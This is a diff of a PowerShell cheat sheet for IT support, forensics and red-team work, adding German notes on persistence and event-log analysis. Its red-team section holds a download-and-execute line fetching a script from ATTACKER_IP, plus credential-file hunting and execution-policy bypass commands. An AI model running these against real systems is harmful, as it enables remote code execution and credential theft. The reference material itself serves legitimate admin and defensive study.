@@ -26,7 +26,7 @@ $PSVersionTable                # PowerShell version info
 
 ---
 
-## Navigation & File System
+## ==Navigation & File System==
 
 | Cmdlet | Alias | Description | Common Parameters |
 |--------|-------|-------------|-------------------|
@@ -38,7 +38,7 @@ $PSVersionTable                # PowerShell version info
 | `Copy-Item <src> <dst>` | `cp` | Copy | `-Recurse`, `-Force` |
 | `Move-Item <src> <dst>` | `mv` | Move/rename | — |
 | `Remove-Item <path>` | `rm`, `del` | Delete | `-Recurse`, `-Force` |
-| `Rename-Item <path> <name>` | — | Rename | — |
+| `Rename-Item <path> <n>` | — | Rename | — |
 | `Test-Path <path>` | — | Check if path exists | — |
 | `Resolve-Path <path>` | — | Resolve relative path | — |
 
@@ -59,7 +59,7 @@ Get-ChildItem -Path C:\ -Recurse -Filter "*.ps1" -ErrorAction SilentlyContinue
 
 ---
 
-## File Content
+## ==File Content==
 
 | Cmdlet | Alias | Description | Common Parameters |
 |--------|-------|-------------|-------------------|
@@ -86,7 +86,7 @@ $encoded = Get-Content .\payload.txt
 
 ---
 
-## System Information
+## ==System Information==
 
 ```powershell
 # OS and hardware overview
@@ -115,7 +115,7 @@ Get-TimeZone
 
 ---
 
-## User & Group Management
+## ==User & Group Management==
 
 | Cmdlet | Description | Common Parameters |
 |--------|-------------|-------------------|
@@ -130,7 +130,7 @@ Get-TimeZone
 | `Get-ADUser` | AD user (requires RSAT) | `-Filter *`, `-Identity`, `-Properties *` |
 | `Get-ADGroupMember` | AD group members | `-Identity`, `-Recursive` |
 | `whoami` | Current user | `/all` – full token with groups and privileges |
-| `net user` | Legacy user management | `net user <name>` details |
+| `net user` | Legacy user management | `net user <n>` details |
 
 ```powershell
 # All local users and their status
@@ -153,9 +153,12 @@ $cutoff = (Get-Date).AddDays(-90)
 Get-ADUser -Filter {LastLogonDate -lt $cutoff -and Enabled -eq $true} -Properties LastLogonDate
 ```
 
+> [!warning] Persistence-Check: Lokale Admins und UID 0-Äquivalent
+> `Get-LocalGroupMember -Group "Administrators"` zeigt alle lokalen Admin-Accounts. Nach einer Kompromittierung: jeder unbekannte Eintrag ist verdächtig. Auch `whoami /all` prüfen — Angreifer fügen sich oft selbst zu privilegierten Gruppen hinzu.
+
 ---
 
-## Process Management
+## ==Process Management==
 
 | Cmdlet | Alias | Description | Common Parameters |
 |--------|-------|-------------|-------------------|
@@ -183,9 +186,12 @@ Stop-Process -Name "notepad" -Force
 if (Get-Process -Name "malware" -ErrorAction SilentlyContinue) { Write-Host "Running" }
 ```
 
+> [!tip] `Get-CimInstance Win32_Process` statt `Get-Process`
+> `Get-Process` zeigt keine Parent-PIDs und keine vollständigen Command Lines. `Get-CimInstance Win32_Process` liefert beides — unverzichtbar für die Prozessbaum-Analyse wie in [[Windows Endpoint Monitoring]].
+
 ---
 
-## Network
+## ==Network==
 
 | Cmdlet | Description | Common Parameters |
 |--------|-------------|-------------------|
@@ -222,16 +228,13 @@ Resolve-DnsName google.com -Type MX
 # Download file (curl equivalent)
 Invoke-WebRequest -Uri "http://target.com/file.zip" -OutFile "C:\Temp\file.zip"
 
-# Simple HTTP GET and display response
-(Invoke-WebRequest -Uri "http://target.com").Content
-
 # ARP cache
 Get-NetNeighbor -AddressFamily IPv4
 ```
 
 ---
 
-## Services
+## ==Services==
 
 | Cmdlet | Description | Common Parameters |
 |--------|-------------|-------------------|
@@ -253,14 +256,11 @@ Get-CimInstance Win32_Service |
 
 # Stopped services that are set to auto-start (troubleshooting)
 Get-Service | Where-Object { $_.Status -eq "Stopped" -and $_.StartType -eq "Automatic" }
-
-# Check a specific service
-Get-Service -Name "wuauserv" | Select-Object *
 ```
 
 ---
 
-## Registry
+## ==Registry==
 
 | Cmdlet | Description | Example |
 |--------|-------------|---------|
@@ -286,15 +286,14 @@ foreach ($key in $runKeys) {
 
 # Check AppInit_DLLs (DLL injection persistence)
 Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name AppInit_DLLs
-
-# Find recently modified registry keys (last 7 days is not directly available via PowerShell;
-# use Get-Item and check LastWriteTime on the key object)
-(Get-Item "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run").LastWriteTime
 ```
+
+> [!warning] Registry Persistence Locations
+> Die vier Run-Keys (`HKLM\...\Run`, `HKCU\...\Run`, je `RunOnce`) sind die klassischsten Persistence-Standorte — Malware trägt sich hier ein, um bei jedem Login zu starten. Auch `AppInit_DLLs` prüfen: eine DLL dort wird in jeden Prozess injiziert, der `user32.dll` lädt.
 
 ---
 
-## Event Logs
+## ==Event Logs==
 
 | Cmdlet | Description | Common Parameters |
 |--------|-------------|-------------------|
@@ -303,13 +302,6 @@ Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -N
 | `Clear-EventLog` | Clear event log | `-LogName` |
 
 ```powershell
-# Last 50 System errors
-Get-EventLog -LogName System -EntryType Error -Newest 50
-
-# PowerShell execution events (script block logging – Event ID 4104)
-Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
-    Where-Object { $_.Id -eq 4104 } | Select-Object -First 20 TimeCreated, Message
-
 # Failed logon attempts (Event ID 4625)
 Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 50 |
     Select-Object TimeCreated, Message
@@ -326,11 +318,18 @@ Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} |
 Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} -MaxEvents 100 |
     Select-Object TimeCreated, @{N="Process"; E={$_.Properties[5].Value}}, @{N="CommandLine"; E={$_.Properties[8].Value}}
 
+# PowerShell script block logging (Event ID 4104)
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
+    Where-Object { $_.Id -eq 4104 } | Select-Object -First 20 TimeCreated, Message
+
 # Export events to CSV
 Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 500 |
     Select-Object TimeCreated, Message |
     Export-Csv -Path C:\Temp\failed_logons.csv -NoTypeInformation
 ```
+
+> [!tip] `Get-WinEvent` statt `Get-EventLog`
+> `Get-EventLog` ist legacy und funktioniert nicht für alle Log-Kanäle (z.B. Sysmon, PowerShell/Operational). `Get-WinEvent` mit `-FilterHashtable` ist schneller, flexibler und der Standard für SOC-Arbeit.
 
 ### Key Event IDs
 
@@ -351,7 +350,7 @@ Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 500 |
 
 ---
 
-## Scheduled Tasks
+## ==Scheduled Tasks==
 
 ```powershell
 # List all scheduled tasks
@@ -373,17 +372,12 @@ Get-ScheduledTask |
 
 ---
 
-## Hashing & Encoding
+## ==Hashing & Encoding==
 
 ```powershell
 # File hash (MD5, SHA1, SHA256)
 Get-FileHash .\malware.exe -Algorithm SHA256
 Get-FileHash .\malware.exe -Algorithm MD5
-
-# Hash a string
-$str = "Hello"
-$bytes = [System.Text.Encoding]::UTF8.GetBytes($str)
-[System.BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash($bytes)) -replace "-"
 
 # Base64 encode a string
 [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("whoami"))
@@ -391,13 +385,13 @@ $bytes = [System.Text.Encoding]::UTF8.GetBytes($str)
 # Base64 decode
 [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("d2hvYW1p"))
 
-# Base64 encode a file (for exfil simulation / analysis)
+# Base64 encode a file
 [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\file.txt"))
 ```
 
 ---
 
-## Remoting & WMI
+## ==Remoting & WMI==
 
 ```powershell
 # Enable PS remoting (requires admin)
@@ -424,7 +418,7 @@ Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration | Where-Object { $_
 
 ---
 
-## Output & Formatting
+## ==Output & Formatting==
 
 ```powershell
 # Pipe to table
@@ -454,7 +448,7 @@ Get-NetTCPConnection | ConvertTo-Json | Out-File connections.json
 
 ---
 
-## Execution Policy & AMSI
+## ==Execution Policy & AMSI==
 
 ```powershell
 # Check current execution policy
@@ -472,7 +466,7 @@ powershell.exe -ExecutionPolicy Bypass -File script.ps1
 
 ---
 
-## Quick Reference: IT Support Scenarios
+## ==Quick Reference: IT Support Scenarios==
 
 ```powershell
 # --- Check disk space ---
@@ -494,14 +488,11 @@ Enable-LocalUser -Name jsmith             # local
 
 # --- Check Windows Update status ---
 Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10
-
-# --- List installed software ---
-Get-Package | Select-Object Name, Version | Sort-Object Name
 ```
 
 ---
 
-## Quick Reference: Blue Team / Forensics
+## ==Quick Reference: Blue Team / Forensics==
 
 ```powershell
 # --- Initial triage ---
@@ -529,7 +520,7 @@ Get-ChildItem C:\Users -Recurse -File -ErrorAction SilentlyContinue |
 
 ---
 
-## Quick Reference: Red Team / Recon
+## ==Quick Reference: Red Team / Recon==
 
 ```powershell
 # --- Local enumeration ---
@@ -546,12 +537,9 @@ Get-NetNeighbor -AddressFamily IPv4          # ARP cache
 # --- Credential locations ---
 cmdkey /list                                  # cached credentials
 Get-ChildItem C:\Users -Recurse -Filter "*.xml" -ErrorAction SilentlyContinue | Select-Object FullName
-# Look for: unattend.xml, sysprep.xml, groups.xml, web.config
 
 # --- Download and execute (for lab / CTF use only) ---
 IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/script.ps1')
-# Or:
-Invoke-WebRequest -Uri "http://ATTACKER_IP/payload.exe" -OutFile "C:\Temp\payload.exe"
 
 # --- Bypass execution policy (single command) ---
 powershell -ep bypass -c "Get-Process"
@@ -565,7 +553,8 @@ Get-AppLockerPolicy -Effective | Select-Xml -XPath "//FilePathRule" | Select-Obj
 ## Related
 
 - [[Linux Terminal Commands]] – Linux/Unix equivalent commands for IT support and security tasks
-- [[ffuf Cheat Sheet]] – Web fuzzing tool, often used in combination with PowerShell recon output
+- [[Windows Endpoint Monitoring]] – Core Windows Processes, Event Logs, Sysmon
+- [[ffuf Cheat Sheet]] – Web fuzzing tool
 - [[Snort]] – Network-level detection complementing host-based PowerShell analysis
 
 ---
